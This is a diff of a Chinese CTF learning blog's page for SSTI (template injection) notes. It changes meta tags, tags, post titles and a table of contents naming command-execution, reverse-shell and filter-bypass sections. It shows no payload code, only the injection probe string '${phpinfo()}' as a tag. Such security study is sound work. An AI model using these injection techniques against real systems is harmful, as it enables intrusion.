@@ -6,19 +6,26 @@
   <meta name="keywords" content=" 学习笔记 , ssti ">
   <meta name="description" content="ssti模版注入 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Flask是一个非常小的PythonWeb框架，被称为微型框架；只提供了一个稳健的核心，其他功能全部是通过扩展实现的；意思就是我们可以根据项目的需要量身定制，也意味着我们需要学习各种扩展库的使用。 基本概念创建通过创建路由并关联函数，实现一个基本的网页 1234567891011121314151617181920from flask import Flask# 用当前脚本名称实例化Flask对">
+<meta name="description" content="极客大挑战2019-FinalSQL一打开是一个登录界面  上面有几个按钮1到5全部按一遍，发现都没什么信息，除了最后一个  这里提示我们进入第六个按钮，但是没有，但是发现url里的传参id&#x3D;5 改成 1http:&#x2F;&#x2F;a394f536-8135-4a4b-9720-535d541c8f4a.node5.buuoj.cn:81&#x2F;search.php?id&#x3D;6  还是没有 在首页的登录框试了">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Flask库学习">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/03/23/Flask%E5%BA%93%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:title" content="极客大挑战2019-FinalSQL">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="Flask是一个非常小的PythonWeb框架，被称为微型框架；只提供了一个稳健的核心，其他功能全部是通过扩展实现的；意思就是我们可以根据项目的需要量身定制，也意味着我们需要学习各种扩展库的使用。 基本概念创建通过创建路由并关联函数，实现一个基本的网页 1234567891011121314151617181920from flask import Flask# 用当前脚本名称实例化Flask对">
+<meta property="og:description" content="极客大挑战2019-FinalSQL一打开是一个登录界面  上面有几个按钮1到5全部按一遍，发现都没什么信息，除了最后一个  这里提示我们进入第六个按钮，但是没有，但是发现url里的传参id&#x3D;5 改成 1http:&#x2F;&#x2F;a394f536-8135-4a4b-9720-535d541c8f4a.node5.buuoj.cn:81&#x2F;search.php?id&#x3D;6  还是没有 在首页的登录框试了">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-03-23T08:10:30.000Z">
-<meta property="article:modified_time" content="2025-03-23T08:16:35.256Z">
+<meta property="og:image" content="https://mixbp.github.io/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-2.png">
+<meta property="og:image" content="https://mixbp.github.io/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-3.png">
+<meta property="og:image" content="https://mixbp.github.io/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-4.png">
+<meta property="og:image" content="https://mixbp.github.io/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-5.png">
+<meta property="article:published_time" content="2025-03-29T10:32:48.000Z">
+<meta property="article:modified_time" content="2025-03-29T12:07:02.019Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="学习笔记">
-<meta property="article:tag" content="Flask">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="sql盲注">
+<meta property="article:tag" content="异或盲注">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -117,7 +124,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(46)</small>
+                <small>(64)</small>
             
         </div>
     </li>
@@ -152,8 +159,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="46">
-<input type="hidden" id="yelog_site_word_count" value="125k">
+<input type="hidden" id="yelog_site_posts_number" value="64">
+<input type="hidden" id="yelog_site_word_count" value="146.5k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -199,7 +206,19 @@
     <div class="tag-wrapper">
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>${phpinfo()}</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>报错注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代码审计</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>动态调用方法</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -207,7 +226,19 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>二次注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反序列化逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>取反绕过</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -219,11 +250,23 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>特殊变量名传参</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>文件包含</a>
             </li>
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>无列名注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>无字母数字RCE</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -235,7 +278,19 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>异或盲注</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>异或绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>正则表达式</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>字符串逃逸</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -243,7 +298,27 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Apache SSI 远程命令执行漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>assert和eval</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>delimiter更改sql语句结束符</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>escapeshellarg()和escapeshellcmd()、单引号逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>escapeshellarg和escapeshellcmd函数的绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>extract覆盖函数</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -255,11 +330,27 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>gc回收</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>glob函数</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>handler读表</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>HTML</a>
             </li>
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>http协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>intval</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -271,7 +362,23 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>MariaDB数据库</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>md5</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>md5碰撞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>MySQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>nmap</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -295,7 +402,19 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP原生类</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python脚本编写</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql盲注</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -308,6 +427,14 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>swp泄露</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>unicode</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -339,6 +466,168 @@
         
         
         <a  class="All "
+           href="/2025/03/30/BJDCTF2020-EasySearch1/"
+           data-tag="swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
+           data-author="" >
+            <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
+            <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL/"
+           data-tag="sql注入,sql盲注,异或盲注"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019-FinalSQL">极客大挑战2019-FinalSQL</span>
+            <span class="post-date" title="2025-03-29 18:32:48">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/ASIS2019-Unicorn-shop/"
+           data-tag="unicode"
+           data-author="" >
+            <span class="post-title" title="ASIS2019-Unicorn-shop">ASIS2019-Unicorn-shop</span>
+            <span class="post-date" title="2025-03-29 01:34:44">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/NPUCTF2020-ReadlezPHP/"
+           data-tag="php特性,assert和eval,动态调用方法"
+           data-author="" >
+            <span class="post-title" title="NPUCTF2020-ReadlezPHP">NPUCTF2020-ReadlezPHP</span>
+            <span class="post-date" title="2025-03-29 01:34:13">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME/"
+           data-tag="无字母数字RCE,异或绕过,取反绕过"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019-RCE-ME">极客大挑战2019-RCE-ME</span>
+            <span class="post-date" title="2025-03-29 01:33:00">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/SWPU2019-Web1/"
+           data-tag="sql注入,二次注入,无列名注入,MariaDB数据库"
+           data-author="" >
+            <span class="post-title" title="SWPU2019-Web1">SWPU2019-Web1</span>
+            <span class="post-date" title="2025-03-29 01:32:39">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/28/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/"
+           data-tag="刷题笔记,nmap,escapeshellarg和escapeshellcmd函数的绕过"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020朱雀组-Nmap">网鼎杯2020朱雀组-Nmap</span>
+            <span class="post-date" title="2025-03-28 22:26:14">2025/03/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A21/"
+           data-tag="刷题笔记,信息搜集,python脚本编写"
+           data-author="" >
+            <span class="post-title" title="强网杯2019-高明的黑客1">强网杯2019-高明的黑客1</span>
+            <span class="post-date" title="2025-03-28 21:33:56">2025/03/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-serialize-php1/"
+           data-tag="刷题笔记,php反序列化,字符串逃逸,extract覆盖函数"
+           data-author="" >
+            <span class="post-title" title="安洵杯2019-easy_serialize_php1">安洵杯2019-easy_serialize_php1</span>
+            <span class="post-date" title="2025-03-28 20:49:15">2025/03/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/28/ez-php/"
+           data-tag="刷题笔记,php反序列化,特殊变量名传参,gc回收,反序列化逃逸"
+           data-author="" >
+            <span class="post-title" title="ez_php">ez_php</span>
+            <span class="post-date" title="2025-03-28 16:41:00">2025/03/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/27/Sql-Inject-or-RCE/"
+           data-tag="刷题笔记,sql注入,堆叠注入,handler读表,delimiter更改sql语句结束符"
+           data-author="" >
+            <span class="post-title" title="Sql-Inject-or-RCE">Sql-Inject-or-RCE</span>
+            <span class="post-date" title="2025-03-27 22:04:19">2025/03/27</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/27/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"
+           data-tag="PHP原生类"
+           data-author="" >
+            <span class="post-title" title="PHP原生类">PHP原生类</span>
+            <span class="post-date" title="2025-03-27 21:39:53">2025/03/27</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/27/only-one-sql/"
+           data-tag="刷题笔记,sql注入,sql盲注"
+           data-author="" >
+            <span class="post-title" title="only-one-sql">only-one-sql</span>
+            <span class="post-date" title="2025-03-27 21:04:25">2025/03/27</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/26/%E5%A4%8D%E8%AF%BB%E6%9C%BA/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="复读机">复读机</span>
+            <span class="post-date" title="2025-03-26 23:37:23">2025/03/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/26/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5/"
+           data-tag="php特性,md5"
+           data-author="" >
+            <span class="post-title" title="所以你说你懂MD5?">所以你说你懂MD5?</span>
+            <span class="post-date" title="2025-03-26 21:36:42">2025/03/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/26/ez-php-jail/"
+           data-tag="命令执行,glob函数"
+           data-author="" >
+            <span class="post-title" title="ez_php_jail">ez_php_jail</span>
+            <span class="post-date" title="2025-03-26 20:21:52">2025/03/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/25/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/"
+           data-tag="php特性,命令执行,md5,intval"
+           data-author="" >
+            <span class="post-title" title="WUSTCTF2020-朴实无华1">WUSTCTF2020-朴实无华1</span>
+            <span class="post-date" title="2025-03-25 00:11:56">2025/03/25</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/24/ssti-flask-labs/"
+           data-tag="学习笔记,ssti"
+           data-author="" >
+            <span class="post-title" title="ssti-flask-labs">ssti-flask-labs</span>
+            <span class="post-date" title="2025-03-24 19:06:24">2025/03/24</span>
+        </a>
+        
+        
+        <a  class="All "
            href="/2025/03/23/Flask%E5%BA%93%E5%AD%A6%E4%B9%A0/"
            data-tag="学习笔记,Flask"
            data-author="" >
@@ -367,7 +656,7 @@
         
         <a  class="All "
            href="/2025/03/21/BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"
-           data-tag="刷题笔记,php特性"
+           data-tag="刷题笔记,php特性,${phpinfo()}"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-ZJCTF不过如此">BJDCTF2020-ZJCTF不过如此</span>
             <span class="post-date" title="2025-03-21 19:04:56">2025/03/21</span>
@@ -790,12 +1079,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-03-23 20:29:12'>2025-03-21 21:17</time>
+            Created At : <time class="date" title='Updated At: 2025-03-30 16:17:36'>2025-03-21 21:17</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:3.8k</span>
+        <span>Count:6.5k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -825,7 +1114,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">SSTI模版注入漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%A8%A1%E7%89%88%E7%B1%BB%E5%9E%8B%E6%96%B9%E6%B3%95"><span class="toc-text">判断模版类型方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-jinjia2"><span class="toc-text">python jinjia2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B"><span class="toc-text">漏洞示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%88%E5%85%B3%E9%94%AE%EF%BC%89"><span class="toc-text">python继承关系和魔术方法（关键）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E6%BC%94%E7%A4%BA"><span class="toc-text">继承关系演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">检查漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ssti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">利用ssti命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-text">ssti常用注入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E9%9C%80%E5%AD%90%E7%B1%BB"><span class="toc-text">查找所需子类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FileLoader%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">FileLoader的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">内建函数eval执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-text">os模块执行命令（常用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88%E7%94%A8%E7%9A%84%E4%B8%8D%E5%A4%9A%EF%BC%89"><span class="toc-text">importlib类执行命令（用的不多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">linecache函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">subprocess.Popen类执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">ssti绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-text">绕过过滤双大括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BEssti"><span class="toc-text">无回显ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-text">带外注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%AF%E7%9B%B2%E6%B3%A8"><span class="toc-text">纯盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6"><span class="toc-text">写入静态文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getitem%E7%BB%95%E8%BF%87%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">getitem绕过中括号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getitem-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">__getitem__()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E8%BF%87%E6%BB%A4-%E4%BE%8B%E9%A2%98"><span class="toc-text">WAF过滤[]例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#request%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">request绕过单双引号过滤</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">SSTI模版注入漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%A8%A1%E7%89%88%E7%B1%BB%E5%9E%8B%E6%96%B9%E6%B3%95"><span class="toc-text">判断模版类型方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-jinjia2"><span class="toc-text">python jinjia2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B"><span class="toc-text">漏洞示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%88%E5%85%B3%E9%94%AE%EF%BC%89"><span class="toc-text">python继承关系和魔术方法（关键）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E6%BC%94%E7%A4%BA"><span class="toc-text">继承关系演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">检查漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ssti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">利用ssti命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-text">ssti常用注入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E9%9C%80%E5%AD%90%E7%B1%BB"><span class="toc-text">查找所需子类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FileLoader%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">FileLoader的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">内建函数eval执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-text">os模块执行命令（常用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88%E7%94%A8%E7%9A%84%E4%B8%8D%E5%A4%9A%EF%BC%89"><span class="toc-text">importlib类执行命令（用的不多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">linecache函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">subprocess.Popen类执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">ssti绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-text">绕过过滤双大括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BEssti"><span class="toc-text">无回显ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-text">带外注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%AF%E7%9B%B2%E6%B3%A8"><span class="toc-text">纯盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6"><span class="toc-text">写入静态文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getitem%E7%BB%95%E8%BF%87%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">getitem绕过中括号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getitem-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">__getitem__()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E8%BF%87%E6%BB%A4-%E4%BE%8B%E9%A2%98"><span class="toc-text">WAF过滤[]例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#request%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">request绕过单双引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4"><span class="toc-text">过滤器绕过下划线过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E5%B8%B8%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">flask常用过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 